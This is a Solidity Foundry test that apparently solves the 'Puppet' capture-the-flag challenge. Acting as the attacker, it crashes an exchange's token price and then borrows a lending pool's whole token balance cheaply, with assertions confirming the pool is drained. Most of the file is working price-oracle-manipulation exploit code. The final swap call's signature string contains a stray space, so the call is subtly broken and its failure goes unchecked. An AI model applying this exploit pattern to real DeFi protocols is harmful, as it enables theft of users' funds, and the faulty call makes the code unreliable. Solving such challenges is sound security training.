// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/PuppetFixture.sol";

contract PuppetTest is PuppetFixture {

    function setUp() public override {
        super.setUp();
    }

    function test_puppet() public {

        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        // Code your exploit here

        token.approve(exchange, ATTACKER_INITIAL_TOKEN_BALANCE);

        exchange.call(abi.encodeWithSignature("getTokenToEthInputPrice(uint256)", ATTACKER_INITIAL_TOKEN_BALANCE));

        exchange.call(abi.encodeWithSignature("tokenToEthSwapInput(uint256,uint256,uint256)", ATTACKER_INITIAL_TOKEN_BALANCE, 9 ether, block.timestamp * 2));

        uint256 depositRequired = pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        pool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE);

        uint256 tokensToBuyBack = ATTACKER_INITIAL_TOKEN_BALANCE;

        (, bytes memory data) = exchange.call(abi.encodeWithSignature("getEthToTokenOutputPrice(uint256)", tokensToBuyBack));
        uint256 ethToSend = abi.decode(data, (uint256));

        exchange.call{value: ethToSend}(abi.encodeWithSignature("ethToTokenSwapOutput(uint256, uint256)", tokensToBuyBack, block.timestamp * 2));

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // The lending pool has no tokens left.
        assertEq(token.balanceOf(address(pool)), 0);
        // The attacker has all the tokens.
        assertGt(token.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
    }
}